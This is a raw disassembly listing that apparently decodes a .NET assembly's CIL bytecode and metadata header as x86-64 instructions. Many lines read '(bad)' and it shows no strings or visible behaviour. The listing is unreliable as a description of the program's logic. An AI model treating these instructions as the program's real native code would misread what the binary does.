   140002aa5:	a8 0e                	test   $0xe,%al
   140002aa7:	00 70 02             	add    %dh,0x2(%rax)
   140002aaa:	72 f8                	jb     0x140002aa4
   140002aac:	0e                   	(bad)
   140002aad:	00 70 28             	add    %dh,0x28(%rax)
   140002ab0:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   140002ab5:	0a 28                	or     (%rax),%ch
   140002ab7:	0d 00 00 06 de       	or     $0xde060000,%eax
   140002abc:	44 13 05 72 fe 0e 00 	adc    0xefe72(%rip),%r8d        # 0x1400f2935
   140002ac3:	70 1b                	jo     0x140002ae0
   140002ac5:	8d 26                	lea    (%rsi),%esp
   140002ac7:	00 00                	add    %al,(%rax)
   140002ac9:	01 25 16 72 1a 0f    	add    %esp,0xf1a7216(%rip)        # 0x14f1a9ce5
   140002acf:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002ad2:	25 17 02 a2 25       	and    $0x25a20217,%eax
   140002ad7:	18 72 58             	sbb    %dh,0x58(%rdx)
   140002ada:	0f 00                	(bad)
   140002adc:	70 a2                	jo     0x140002a80
   140002ade:	25 19 11 05 6f       	and    $0x6f051119,%eax
   140002ae3:	33 00                	xor    (%rax),%eax
   140002ae5:	00 0a                	add    %cl,(%rdx)
   140002ae7:	a2 25 1a 72 74 0f 00 	movabs %al,0xa270000f74721a25
   140002aee:	70 a2 
   140002af0:	28 34 00             	sub    %dh,(%rax,%rax,1)
   140002af3:	00 0a                	add    %cl,(%rdx)
   140002af5:	1f                   	(bad)
   140002af6:	0c 28                	or     $0x28,%al
   140002af8:	0d 00 00 06 dd       	or     $0xdd060000,%eax
   140002afd:	33 01                	xor    (%rcx),%eax
   140002aff:	00 00                	add    %al,(%rax)
   140002b01:	1f                   	(bad)
   140002b02:	64 28 35 00 00 0a 28 	sub    %dh,%fs:0x280a0000(%rip)        # 0x1680a2b09
   140002b09:	5d                   	pop    %rbp
   140002b0a:	00 00                	add    %al,(%rax)
   140002b0c:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140002b0f:	00 00                	add    %al,(%rax)
   140002b11:	0a 28                	or     (%rax),%ch
   140002b13:	5a                   	pop    %rdx
   140002b14:	00 00                	add    %al,(%rax)
   140002b16:	0a 13                	or     (%rbx),%dl
   140002b18:	04 02                	add    $0x2,%al
   140002b1a:	28 19                	sub    %bl,(%rcx)
   140002b1c:	00 00                	add    %al,(%rax)
   140002b1e:	0a 6f 1a             	or     0x1a(%rdi),%ch
   140002b21:	00 00                	add    %al,(%rax)
   140002b23:	0a 28                	or     (%rax),%ch
   140002b25:	55                   	push   %rbp
   140002b26:	00 00                	add    %al,(%rax)
   140002b28:	0a 39                	or     (%rcx),%bh
   140002b2a:	06                   	(bad)
   140002b2b:	01 00                	add    %eax,(%rax)
   140002b2d:	00 7e 2a             	add    %bh,0x2a(%rsi)
   140002b30:	00 00                	add    %al,(%rax)
   140002b32:	0a 72 cd             	or     -0x33(%rdx),%dh
   140002b35:	00 00                	add    %al,(%rax)
   140002b37:	70 6f                	jo     0x140002ba8
   140002b39:	51                   	push   %rcx
   140002b3a:	00 00                	add    %al,(%rax)
   140002b3c:	0a 72 df             	or     -0x21(%rdx),%dh
   140002b3f:	00 00                	add    %al,(%rax)
   140002b41:	70 6f                	jo     0x140002bb2
   140002b43:	51                   	push   %rcx
   140002b44:	00 00                	add    %al,(%rax)
   140002b46:	0a 28                	or     (%rax),%ch
   140002b48:	19 00                	sbb    %eax,(%rax)
   140002b4a:	00 0a                	add    %cl,(%rdx)
   140002b4c:	6f                   	outsl  (%rsi),(%dx)
   140002b4d:	1a 00                	sbb    (%rax),%al
   140002b4f:	00 0a                	add    %cl,(%rdx)
   140002b51:	14 6f                	adc    $0x6f,%al
   140002b53:	2f                   	(bad)
   140002b54:	00 00                	add    %al,(%rax)
   140002b56:	0a 39                	or     (%rcx),%bh
   140002b58:	d8 00                	fadds  (%rax)
   140002b5a:	00 00                	add    %al,(%rax)
   140002b5c:	7e 2a                	jle    0x140002b88
   140002b5e:	00 00                	add    %al,(%rax)
   140002b60:	0a 72 cd             	or     -0x33(%rdx),%dh
   140002b63:	00 00                	add    %al,(%rax)
   140002b65:	70 17                	jo     0x140002b7e
   140002b67:	6f                   	outsl  (%rsi),(%dx)
   140002b68:	2b 00                	sub    (%rax),%eax
   140002b6a:	00 0a                	add    %cl,(%rdx)
   140002b6c:	72 df                	jb     0x140002b4d
   140002b6e:	00 00                	add    %al,(%rax)
   140002b70:	70 17                	jo     0x140002b89
   140002b72:	6f                   	outsl  (%rsi),(%dx)
   140002b73:	2c 00                	sub    $0x0,%al
   140002b75:	00 0a                	add    %cl,(%rdx)
   140002b77:	02 72 17             	add    0x17(%rdx),%dh
   140002b7a:	03 00                	add    (%rax),%eax
   140002b7c:	70 6f                	jo     0x140002bed
   140002b7e:	46 00 00             	rex.RX add %r8b,(%rax)
   140002b81:	0a 02                	or     (%rdx),%al
   140002b83:	28 5e 00             	sub    %bl,0x0(%rsi)
   140002b86:	00 0a                	add    %cl,(%rdx)
   140002b88:	02 11                	add    (%rcx),%dl
   140002b8a:	04 28                	add    $0x28,%al
   140002b8c:	4d 00 00             	rex.WRB add %r8b,(%r8)
   140002b8f:	0a 03                	or     (%rbx),%al
   140002b91:	2d 42 28 06 00       	sub    $0x62842,%eax
   140002b96:	00 06                	add    %al,(%rsi)
   140002b98:	13 06                	adc    (%rsi),%eax
   140002b9a:	11 06                	adc    %eax,(%rsi)
   140002b9c:	45 03 00             	add    (%r8),%r8d
   140002b9f:	00 00                	add    %al,(%rax)
   140002ba1:	02 00                	add    (%rax),%al
   140002ba3:	00 00                	add    %al,(%rax)
   140002ba5:	0b 00                	or     (%rax),%eax
   140002ba7:	00 00                	add    %al,(%rax)
   140002ba9:	02 00                	add    (%rax),%al
   140002bab:	00 00                	add    %al,(%rax)
   140002bad:	2b 26                	sub    (%rsi),%esp
   140002baf:	08 28                	or     %ch,(%rax)
   140002bb1:	1f                   	(bad)
   140002bb2:	00 00                	add    %al,(%rax)
   140002bb4:	0a 26                	or     (%rsi),%ah
   140002bb6:	2b 1d 73 5f 00 00    	sub    0x5f73(%rip),%ebx        # 0x140008b2f
   140002bbc:	0a 25 72 8c 0f 00    	or     0xf8c72(%rip),%ah        # 0x1400fb834
   140002bc2:	70 6f                	jo     0x140002c33
   140002bc4:	60                   	(bad)
   140002bc5:	00 00                	add    %al,(%rax)
   140002bc7:	0a 25 02 6f 61 00    	or     0x616f02(%rip),%ah        # 0x140619acf
   140002bcd:	00 0a                	add    %cl,(%rdx)
   140002bcf:	28 62 00             	sub    %ah,0x0(%rdx)
   140002bd2:	00 0a                	add    %cl,(%rdx)
   140002bd4:	26 72 98             	es jb  0x140002b6f
   140002bd7:	0f 00                	(bad)
   140002bd9:	70 72                	jo     0x140002c4d
   140002bdb:	b8 0f 00 70 02       	mov    $0x270000f,%eax
   140002be0:	72 f8                	jb     0x140002bda
   140002be2:	0e                   	(bad)
   140002be3:	00 70 28             	add    %dh,0x28(%rax)
   140002be6:	1d 00 00 0a 1f       	sbb    $0x1f0a0000,%eax
   140002beb:	0a 28                	or     (%rax),%ch
   140002bed:	0d 00 00 06 de       	or     $0xde060000,%eax
   140002bf2:	41 13 07             	adc    (%r15),%eax
   140002bf5:	72 0c                	jb     0x140002c03
   140002bf7:	10 00                	adc    %al,(%rax)
   140002bf9:	70 1b                	jo     0x140002c16
   140002bfb:	8d 26                	lea    (%rsi),%esp
   140002bfd:	00 00                	add    %al,(%rax)
   140002bff:	01 25 16 72 1a 0f    	add    %esp,0xf1a7216(%rip)        # 0x14f1a9e1b
   140002c05:	00 70 a2             	add    %dh,-0x5e(%rax)
   140002c08:	25 17 02 a2 25       	and    $0x25a20217,%eax
   140002c0d:	18 72 58             	sbb    %dh,0x58(%rdx)
   140002c10:	0f 00                	(bad)
   140002c12:	70 a2                	jo     0x140002bb6
   140002c14:	25 19 11 07 6f       	and    $0x6f071119,%eax
   140002c19:	63 00                	movsxd (%rax),%eax
   140002c1b:	00 0a                	add    %cl,(%rdx)
   140002c1d:	a2 25 1a 72 74 0f 00 	movabs %al,0xa270000f74721a25
   140002c24:	70 a2 
   140002c26:	28 34 00             	sub    %dh,(%rax,%rax,1)
   140002c29:	00 0a                	add    %cl,(%rdx)
   140002c2b:	1f                   	(bad)
   140002c2c:	0c 28                	or     $0x28,%al
   140002c2e:	0d 00 00 06 de       	or     $0xde060000,%eax
   140002c33:	00 2a                	add    %ch,(%rdx)
   140002c35:	00 00                	add    %al,(%rax)
   140002c37:	00 01                	add    %al,(%rcx)
   140002c39:	1c 00                	sbb    $0x0,%al
   140002c3b:	00 00                	add    %al,(%rax)
   140002c3d:	00 36                	add    %dh,(%rsi)
   140002c3f:	00 33                	add    %dh,(%rbx)
   140002c41:	69 00 44 17 00 00    	imul   $0x1744,(%rax),%eax
   140002c47:	01 00                	add    %eax,(%rax)
   140002c49:	00 2e                	add    %ch,(%rsi)
   140002c4b:	01 71 9f             	add    %esi,-0x61(%rcx)
   140002c4e:	01 41 17             	add    %eax,0x17(%rcx)
   140002c51:	00 00                	add    %al,(%rax)
   140002c53:	01 06                	add    %eax,(%rsi)
   140002c55:	2a 1e                	sub    (%rsi),%bl
   140002c57:	02 28                	add    (%rax),%ch
   140002c59:	64 00 00             	add    %al,%fs:(%rax)
   140002c5c:	0a 2a                	or     (%rdx),%ch
   140002c5e:	6e                   	outsb  (%rsi),(%dx)
   140002c5f:	16                   	(bad)
   140002c60:	80 01 00             	addb   $0x0,(%rcx)
   140002c63:	00 04 72             	add    %al,(%rdx,%rsi,2)
   140002c66:	80 0e 00             	orb    $0x0,(%rsi)
   140002c69:	70 80                	jo     0x140002beb
   140002c6b:	02 00                	add    (%rax),%al
   140002c6d:	00 04 73             	add    %al,(%rbx,%rsi,2)
   140002c70:	65 00 00             	add    %al,%gs:(%rax)
   140002c73:	0a 80 04 00 00 04    	or     0x4000004(%rax),%al
   140002c79:	2a 66 02             	sub    0x2(%rsi),%ah
   140002c7c:	28 64 00 00          	sub    %ah,0x0(%rax,%rax,1)
   140002c80:	0a 02                	or     (%rdx),%al
   140002c82:	03 7d 05             	add    0x5(%rbp),%edi
   140002c85:	00 00                	add    %al,(%rax)
   140002c87:	04 02                	add    $0x2,%al
   140002c89:	28 66 00             	sub    %ah,0x0(%rsi)
   140002c8c:	00 0a                	add    %cl,(%rdx)
   140002c8e:	7d 07                	jge    0x140002c97
   140002c90:	00 00                	add    %al,(%rax)
   140002c92:	04 2a                	add    $0x2a,%al
   140002c94:	06                   	(bad)
   140002c95:	2a 00                	sub    (%rax),%al
   140002c97:	00 1b                	add    %bl,(%rbx)
   140002c99:	30 03                	xor    %al,(%rbx)
   140002c9b:	00 18                	add    %bl,(%rax)
   140002c9d:	01 00                	add    %eax,(%rax)
   140002c9f:	00 0a                	add    %cl,(%rdx)
   140002ca1:	00 00                	add    %al,(%rax)
   140002ca3:	11 02                	adc    %eax,(%rdx)
   140002ca5:	7b 05                	jnp    0x140002cac
   140002ca7:	00 00                	add    %al,(%rax)
   140002ca9:	04 0a                	add    $0xa,%al
   140002cab:	06                   	(bad)
   140002cac:	2c 09                	sub    $0x9,%al
   140002cae:	06                   	(bad)
   140002caf:	17                   	(bad)
   140002cb0:	3b 89 00 00 00 16    	cmp    0x16000000(%rcx),%ecx
   140002cb6:	2a 02                	sub    (%rdx),%al
   140002cb8:	15 7d 05 00 00       	adc    $0x57d,%eax
   140002cbd:	04 02                	add    $0x2,%al
   140002cbf:	73 67                	jae    0x140002d28
   140002cc1:	00 00                	add    %al,(%rax)
   140002cc3:	0a 7d 0c             	or     0xc(%rbp),%bh
   140002cc6:	00 00                	add    %al,(%rax)
   140002cc8:	04 02                	add    $0x2,%al
   140002cca:	7b 0c                	jnp    0x140002cd8
   140002ccc:	00 00                	add    %al,(%rax)
   140002cce:	04 02                	add    $0x2,%al
   140002cd0:	7b 08                	jnp    0x140002cda
   140002cd2:	00 00                	add    %al,(%rax)
   140002cd4:	04 6f                	add    $0x6f,%al
   140002cd6:	68 00 00 0a 38       	push   $0x380a0000
   140002cdb:	cb                   	lret
   140002cdc:	00 00                	add    %al,(%rax)
   140002cde:	00 02                	add    %al,(%rdx)
   140002ce0:	02 7b 0c             	add    0xc(%rbx),%bh
   140002ce3:	00 00                	add    %al,(%rax)
   140002ce5:	04 6f                	add    $0x6f,%al
   140002ce7:	69 00 00 0a 7d 0d    	imul   $0xd7d0a00,(%rax),%eax
   140002ced:	00 00                	add    %al,(%rax)
   140002cef:	04 14                	add    $0x14,%al
   140002cf1:	0b 02                	or     (%rdx),%eax
   140002cf3:	7b 0d                	jnp    0x140002d02
   140002cf5:	00 00                	add    %al,(%rax)
   140002cf7:	04 02                	add    $0x2,%al
   140002cf9:	7b 0a                	jnp    0x140002d05
   140002cfb:	00 00                	add    %al,(%rax)
   140002cfd:	04 28                	add    $0x28,%al
   140002cff:	6a 00                	push   $0x0
   140002d01:	00 0a                	add    %cl,(%rdx)
   140002d03:	0b de                	or     %esi,%ebx
   140002d05:	03 26                	add    (%rsi),%esp
   140002d07:	de 00                	fiadds (%rax)
   140002d09:	07                   	(bad)
   140002d0a:	2c 5e                	sub    $0x5e,%al
   140002d0c:	07                   	(bad)
   140002d0d:	8e 2c 5a             	mov    (%rdx,%rbx,2),%gs
   140002d10:	02 07                	add    (%rdi),%al
   140002d12:	7d 0e                	jge    0x140002d22
   140002d14:	00 00                	add    %al,(%rax)
   140002d16:	04 02                	add    $0x2,%al
   140002d18:	16                   	(bad)
   140002d19:	7d 0f                	jge    0x140002d2a
   140002d1b:	00 00                	add    %al,(%rax)
   140002d1d:	04 2b                	add    $0x2b,%al
   140002d1f:	33 02                	xor    (%rdx),%eax
   140002d21:	7b 0e                	jnp    0x140002d31
   140002d23:	00 00                	add    %al,(%rax)
   140002d25:	04 02                	add    $0x2,%al
   140002d27:	7b 0f                	jnp    0x140002d38
   140002d29:	00 00                	add    %al,(%rax)
   140002d2b:	04 9a                	add    $0x9a,%al
   140002d2d:	0c 02                	or     $0x2,%al
   140002d2f:	08 7d 06             	or     %bh,0x6(%rbp)
   140002d32:	00 00                	add    %al,(%rax)
   140002d34:	04 02                	add    $0x2,%al
   140002d36:	17                   	(bad)
   140002d37:	7d 05                	jge    0x140002d3e
   140002d39:	00 00                	add    %al,(%rax)
   140002d3b:	04 17                	add    $0x17,%al
   140002d3d:	2a 02                	sub    (%rdx),%al
   140002d3f:	15 7d 05 00 00       	adc    $0x57d,%eax
   140002d44:	04 02                	add    $0x2,%al
   140002d46:	02 7b 0f             	add    0xf(%rbx),%bh
   140002d49:	00 00                	add    %al,(%rax)
   140002d4b:	04 17                	add    $0x17,%al
   140002d4d:	58                   	pop    %rax
   140002d4e:	7d 0f                	jge    0x140002d5f
   140002d50:	00 00                	add    %al,(%rax)
   140002d52:	04 02                	add    $0x2,%al
   140002d54:	7b 0f                	jnp    0x140002d65
   140002d56:	00 00                	add    %al,(%rax)
   140002d58:	04 02                	add    $0x2,%al
   140002d5a:	7b 0e                	jnp    0x140002d6a
   140002d5c:	00 00                	add    %al,(%rax)
   140002d5e:	04 8e                	add    $0x8e,%al
   140002d60:	69 32 bd 02 14 7d    	imul   $0x7d1402bd,(%rdx),%esi
   140002d66:	0e                   	(bad)
   140002d67:	00 00                	add    %al,(%rax)
   140002d69:	04 00                	add    $0x0,%al
   140002d6b:	02 7b 0d             	add    0xd(%rbx),%bh
   140002d6e:	00 00                	add    %al,(%rax)
   140002d70:	04 28                	add    $0x28,%al
   140002d72:	56                   	push   %rsi
   140002d73:	00 00                	add    %al,(%rax)
   140002d75:	0a 0b                	or     (%rbx),%cl
   140002d77:	07                   	(bad)
   140002d78:	0d 16 13 04 2b       	or     $0x2b041316,%eax
   140002d7d:	19 09                	sbb    %ecx,(%rcx)
   140002d7f:	11 04 9a             	adc    %eax,(%rdx,%rbx,4)
   140002d82:	13 05 02 7b 0c 00    	adc    0xc7b02(%rip),%eax        # 0x1400ca88a
   140002d88:	00 04 11             	add    %al,(%rcx,%rdx,1)
   140002d8b:	05 6f 68 00 00       	add    $0x686f,%eax
   140002d90:	0a 11                	or     (%rcx),%dl
   140002d92:	04 17                	add    $0x17,%al
   140002d94:	58                   	pop    %rax
   140002d95:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   140002d98:	04 09                	add    $0x9,%al
   140002d9a:	8e 69 32             	mov    0x32(%rcx),%gs
   140002d9d:	e0 de                	loopne 0x140002d7d
   140002d9f:	03 26                	add    (%rsi),%esp
   140002da1:	de 00                	fiadds (%rax)
   140002da3:	02 14 7d 0d 00 00 04 	add    0x400000d(,%rdi,2),%dl
   140002daa:	02 7b 0c             	add    0xc(%rbx),%bh
   140002dad:	00 00                	add    %al,(%rax)
   140002daf:	04 6f                	add    $0x6f,%al
   140002db1:	6b 00 00             	imul   $0x0,(%rax),%eax
   140002db4:	0a 3a                	or     (%rdx),%bh
   140002db6:	25 ff ff ff 16       	and    $0x16ffffff,%eax
   140002dbb:	2a 01                	sub    (%rcx),%al
   140002dbd:	1c 00                	sbb    $0x0,%al
   140002dbf:	00 00                	add    %al,(%rax)
   140002dc1:	00 4e 00             	add    %cl,0x0(%rsi)
   140002dc4:	14 62                	adc    $0x62,%al
   140002dc6:	00 03                	add    %al,(%rbx)
   140002dc8:	10 00                	adc    %al,(%rax)
   140002dca:	00 01                	add    %al,(%rcx)
   140002dcc:	00 00                	add    %al,(%rax)
   140002dce:	c7 00 35 fc 00 03    	movl   $0x300fc35,(%rax)
   140002dd4:	10 00                	adc    %al,(%rax)
   140002dd6:	00 01                	add    %al,(%rcx)
   140002dd8:	1e                   	(bad)
   140002dd9:	02 7b 06             	add    0x6(%rbx),%bh
   140002ddc:	00 00                	add    %al,(%rax)
   140002dde:	04 2a                	add    $0x2a,%al
   140002de0:	1a 73 6c             	sbb    0x6c(%rbx),%dh
   140002de3:	00 00                	add    %al,(%rax)
   140002de5:	0a 7a 1e             	or     0x1e(%rdx),%bh
   140002de8:	02 7b 06             	add    0x6(%rbx),%bh
   140002deb:	00 00                	add    %al,(%rax)
   140002ded:	04 2a                	add    $0x2a,%al
   140002def:	00 13                	add    %dl,(%rbx)
   140002df1:	30 02                	xor    %al,(%rdx)
   140002df3:	00 43 00             	add    %al,0x0(%rbx)
   140002df6:	00 00                	add    %al,(%rax)
   140002df8:	0b 00                	or     (%rax),%eax
   140002dfa:	00 11                	add    %dl,(%rcx)
   140002dfc:	02 7b 05             	add    0x5(%rbx),%bh
   140002dff:	00 00                	add    %al,(%rax)
   140002e01:	04 1f                	add    $0x1f,%al
   140002e03:	fe                   	(bad)
   140002e04:	33 18                	xor    (%rax),%ebx
   140002e06:	02 7b 07             	add    0x7(%rbx),%bh
   140002e09:	00 00                	add    %al,(%rax)
   140002e0b:	04 28                	add    $0x28,%al
   140002e0d:	66 00 00             	data16 add %al,(%rax)
   140002e10:	0a 33                	or     (%rbx),%dh
   140002e12:	0b 02                	or     (%rdx),%eax
   140002e14:	16                   	(bad)
   140002e15:	7d 05                	jge    0x140002e1c
   140002e17:	00 00                	add    %al,(%rax)
   140002e19:	04 02                	add    $0x2,%al
   140002e1b:	0a 2b                	or     (%rbx),%ch
   140002e1d:	07                   	(bad)
   140002e1e:	16                   	(bad)
   140002e1f:	73 10                	jae    0x140002e31
   140002e21:	00 00                	add    %al,(%rax)
   140002e23:	06                   	(bad)
   140002e24:	0a 06                	or     (%rsi),%al
   140002e26:	02 7b 09             	add    0x9(%rbx),%bh
   140002e29:	00 00                	add    %al,(%rax)
   140002e2b:	04 7d                	add    $0x7d,%al
   140002e2d:	08 00                	or     %al,(%rax)
   140002e2f:	00 04 06             	add    %al,(%rsi,%rax,1)
   140002e32:	02 7b 0b             	add    0xb(%rbx),%bh
   140002e35:	00 00                	add    %al,(%rax)
   140002e37:	04 7d                	add    $0x7d,%al
   140002e39:	0a 00                	or     (%rax),%al
   140002e3b:	00 04 06             	add    %al,(%rsi,%rax,1)
   140002e3e:	2a 1e                	sub    (%rsi),%bl
   140002e40:	02 28                	add    (%rax),%ch
   140002e42:	16                   	(bad)
   140002e43:	00 00                	add    %al,(%rax)
   140002e45:	06                   	(bad)
   140002e46:	2a 00                	sub    (%rax),%al
   140002e48:	42 53                	rex.X push %rbx
   140002e4a:	4a                   	rex.WX
   140002e4b:	42 01 00             	rex.X add %eax,(%rax)
   140002e4e:	01 00                	add    %eax,(%rax)
   140002e50:	00 00                	add    %al,(%rax)
   140002e52:	00 00                	add    %al,(%rax)
   140002e54:	0c 00                	or     $0x0,%al
   140002e56:	00 00                	add    %al,(%rax)
   140002e58:	76 34                	jbe    0x140002e8e
   140002e5a:	2e 30 2e             	cs xor %ch,(%rsi)
   140002e5d:	33 30                	xor    (%rax),%esi
   140002e5f:	33 31                	xor    (%rcx),%esi
   140002e61:	39 00                	cmp    %eax,(%rax)
   140002e63:	00 00                	add    %al,(%rax)
   140002e65:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x140009a6b
   140002e6b:	00 fc                	add    %bh,%ah
   140002e6d:	07                   	(bad)
   140002e6e:	00 00                	add    %al,(%rax)
   140002e70:	23 7e 00             	and    0x0(%rsi),%edi
   140002e73:	00 68 08             	add    %ch,0x8(%rax)
   140002e76:	00 00                	add    %al,(%rax)
   140002e78:	14 0b                	adc    $0xb,%al
   140002e7a:	00 00                	add    %al,(%rax)
   140002e7c:	23 53 74             	and    0x74(%rbx),%edx
   140002e7f:	72 69                	jb     0x140002eea
   140002e81:	6e                   	outsb  (%rsi),(%dx)
   140002e82:	67 73 00             	addr32 jae 0x140002e85
   140002e85:	00 00                	add    %al,(%rax)
   140002e87:	00 7c 13 00          	add    %bh,0x0(%rbx,%rdx,1)
   140002e8b:	00 2c 10             	add    %ch,(%rax,%rdx,1)
   140002e8e:	00 00                	add    %al,(%rax)
   140002e90:	23 55 53             	and    0x53(%rbp),%edx
   140002e93:	00 a8 23 00 00 10    	add    %ch,0x10000023(%rax)
   140002e99:	00 00                	add    %al,(%rax)
   140002e9b:	00 23                	add    %ah,(%rbx)
   140002e9d:	47 55                	rex.RXB push %r13
   140002e9f:	49                   	rex.WB
   140002ea0:	44 00 00             	add    %r8b,(%rax)
   140002ea3:	00 b8 23 00 00 00    	add    %bh,0x23(%rax)
   140002ea9:	04 00                	add    $0x0,%al
   140002eab:	00 23                	add    %ah,(%rbx)
   140002ead:	42 6c                	rex.X insb (%dx),(%rdi)
   140002eaf:	6f                   	outsl  (%rsi),(%dx)
   140002eb0:	62                   	(bad)
   140002eb1:	00 00                	add    %al,(%rax)
   140002eb3:	00 00                	add    %al,(%rax)
   140002eb5:	00 00                	add    %al,(%rax)
   140002eb7:	00 02                	add    %al,(%rdx)
   140002eb9:	00 00                	add    %al,(%rax)
   140002ebb:	01 57 1f             	add    %edx,0x1f(%rdi)
   140002ebe:	a2 0b 09 0a 00 00 00 	movabs %al,0x1fa0000000a090b
   140002ec5:	fa 01 
   140002ec7:	33 00                	xor    (%rax),%eax
   140002ec9:	16                   	(bad)
   140002eca:	00 00                	add    %al,(%rax)
   140002ecc:	01 00                	add    %eax,(%rax)
   140002ece:	00 00                	add    %al,(%rax)
   140002ed0:	41 00 00             	add    %al,(%r8)
   140002ed3:	00 03                	add    %al,(%rbx)
   140002ed5:	00 00                	add    %al,(%rax)
   140002ed7:	00 0f                	add    %cl,(%rdi)
   140002ed9:	00 00                	add    %al,(%rax)
   140002edb:	00 17                	add    %dl,(%rdi)
   140002edd:	00 00                	add    %al,(%rax)
   140002edf:	00 0a                	add    %cl,(%rdx)
   140002ee1:	00 00                	add    %al,(%rax)
   140002ee3:	00 05 00 00 00 6c    	add    %al,0x6c000000(%rip)        # 0x1ac002ee9
   140002ee9:	00 00                	add    %al,(%rax)
   140002eeb:	00 01                	add    %al,(%rcx)
   140002eed:	00 00                	add    %al,(%rax)
   140002eef:	00 17                	add    %dl,(%rdi)
   140002ef1:	00 00                	add    %al,(%rax)
   140002ef3:	00 0b                	add    %cl,(%rbx)
   140002ef5:	00 00                	add    %al,(%rax)
   140002ef7:	00 01                	add    %al,(%rcx)
   140002ef9:	00 00                	add    %al,(%rax)
   140002efb:	00 02                	add    %al,(%rdx)
   140002efd:	00 00                	add    %al,(%rax)
   140002eff:	00 02                	add    %al,(%rdx)
   140002f01:	00 00                	add    %al,(%rax)
   140002f03:	00 07                	add    %al,(%rdi)
   140002f05:	00 00                	add    %al,(%rax)
   140002f07:	00 04 00             	add    %al,(%rax,%rax,1)
   140002f0a:	00 00                	add    %al,(%rax)
   140002f0c:	01 00                	add    %eax,(%rax)
   140002f0e:	00 00                	add    %al,(%rax)
   140002f10:	04 00                	add    $0x0,%al
   140002f12:	00 00                	add    %al,(%rax)
   140002f14:	01 00                	add    %eax,(%rax)
   140002f16:	00 00                	add    %al,(%rax)
   140002f18:	01 00                	add    %eax,(%rax)
   140002f1a:	00 00                	add    %al,(%rax)
   140002f1c:	00 00                	add    %al,(%rax)
   140002f1e:	4f 04 01             	rex.WRXB add $0x1,%al
   140002f21:	00 00                	add    %al,(%rax)
   140002f23:	00 00                	add    %al,(%rax)
   140002f25:	00 06                	add    %al,(%rsi)
   140002f27:	00 ad 03 46 07 06    	add    %ch,0x6074603(%rbp)
   140002f2d:	00 1a                	add    %bl,(%rdx)
   140002f2f:	04 46                	add    $0x46,%al
   140002f31:	07                   	(bad)
   140002f32:	06                   	(bad)
   140002f33:	00 ab 02 14 07 0f    	add    %ch,0xf071402(%rbx)
   140002f39:	00 66 07             	add    %ah,0x7(%rsi)
   140002f3c:	00 00                	add    %al,(%rax)
   140002f3e:	06                   	(bad)
   140002f3f:	00 d3                	add    %dl,%bl
   140002f41:	02 95 05 06 00 90    	add    -0x6ffff9fb(%rbp),%dl
   140002f47:	03 95 05 06 00 71    	add    0x71000605(%rbp),%edx
   140002f4d:	03 95 05 06 00 01    	add    0x1000605(%rbp),%edx
   140002f53:	04 95                	add    $0x95,%al
   140002f55:	05 06 00 cd 03       	add    $0x3cd0006,%eax
   140002f5a:	95                   	xchg   %eax,%ebp
   140002f5b:	05 06 00 e6 03       	add    $0x3e60006,%eax
   140002f60:	95                   	xchg   %eax,%ebp
   140002f61:	05 06 00 08 03       	add    $0x3080006,%eax
   140002f66:	95                   	xchg   %eax,%ebp
   140002f67:	05 06 00 bf 02       	add    $0x2bf0006,%eax
   140002f6c:	27                   	(bad)
   140002f6d:	07                   	(bad)
   140002f6e:	06                   	(bad)
   140002f6f:	00 9d 02 27 07 06    	add    %bl,0x6072702(%rbp)
   140002f75:	00 54 03 95          	add    %dl,-0x6b(%rbx,%rax,1)
   140002f79:	05 06 00 23 03       	add    $0x3230006,%eax
   140002f7e:	78 04                	js     0x140002f84
   140002f80:	06                   	(bad)
   140002f81:	00 bc 08 1d 05 0a 00 	add    %bh,0xa051d(%rax,%rcx,1)
   140002f88:	8d 08                	lea    (%rax),%ecx
   140002f8a:	14 07                	adc    $0x7,%al
   140002f8c:	06                   	(bad)
   140002f8d:	00 25 00 a7 00 06    	add    %ah,0x600a700(%rip)        # 0x14600d693
   140002f93:	00 2f                	add    %ch,(%rdi)
   140002f95:	02 1d 05 06 00 ea    	add    -0x15fff9fb(%rip),%bl        # 0x12a0035a0
   140002f9b:	02 46 07             	add    0x7(%rsi),%al
   140002f9e:	06                   	(bad)
   140002f9f:	00 01                	add    %al,(%rcx)
   140002fa1:	00 a7 00 06 00 17    	add    %ah,0x17000600(%rdi)
   140002fa7:	00 a7 00 06 00 b3    	add    %ah,-0x4cfffa00(%rdi)
   140002fad:	05 1d 05 06 00       	add    $0x6051d,%eax
   140002fb2:	f3 05 83 00 06 00    	repz add $0x60083,%eax
   140002fb8:	1d 02 1d 05 06       	sbb    $0x6051d02,%eax
   140002fbd:	00 2b                	add    %ch,(%rbx)
   140002fbf:	05 1d 05 06 00       	add    $0x6051d,%eax
   140002fc4:	24 05                	and    $0x5,%al
   140002fc6:	1d 05 06 00 77       	sbb    $0x77000605,%eax
   140002fcb:	06                   	(bad)
   140002fcc:	1d 05 06 00 82       	sbb    $0x82000605,%eax
   140002fd1:	02 46 07             	add    0x7(%rsi),%al
   140002fd4:	06                   	(bad)
   140002fd5:	00 57 01             	add    %dl,0x1(%rdi)
   140002fd8:	1d 05 06 00 8a       	sbb    $0x8a000605,%eax
   140002fdd:	06                   	(bad)
   140002fde:	5e                   	pop    %rsi
   140002fdf:	08 06                	or     %al,(%rsi)
   140002fe1:	00 4b 01             	add    %cl,0x1(%rbx)
   140002fe4:	5e                   	pop    %rsi
   140002fe5:	08 0a                	or     %cl,(%rdx)
   140002fe7:	00 0f                	add    %cl,(%rdi)
   140002fe9:	00 a7 00 06 00 3c    	add    %ah,0x3c000600(%rdi)
   140002fef:	03 14 07             	add    (%rdi,%rax,1),%edx
   140002ff2:	06                   	(bad)
   140002ff3:	00 ad 0a 95 05 06    	add    %ch,0x605950a(%rbp)
   140002ff9:	00 bc 04 83 00 06 00 	add    %bh,0x60083(%rsp,%rax,1)
   140003000:	d7                   	xlat   (%rbx)
   140003001:	0a 83 00 06 00 94    	or     -0x6bfffa00(%rbx),%al
   140003007:	04 1d                	add    $0x1d,%al
   140003009:	05 06 00 67 01       	add    $0x1670006,%eax
   14000300e:	83 00 06             	addl   $0x6,(%rax)
   140003011:	00 1e                	add    %bl,(%rsi)
   140003013:	0a 67 04             	or     0x4(%rdi),%ah
   140003016:	06                   	(bad)
   140003017:	00 f2                	add    %dh,%dl
   140003019:	00 67 04             	add    %ah,0x4(%rdi)
   14000301c:	06                   	(bad)
   14000301d:	00 00                	add    %al,(%rax)
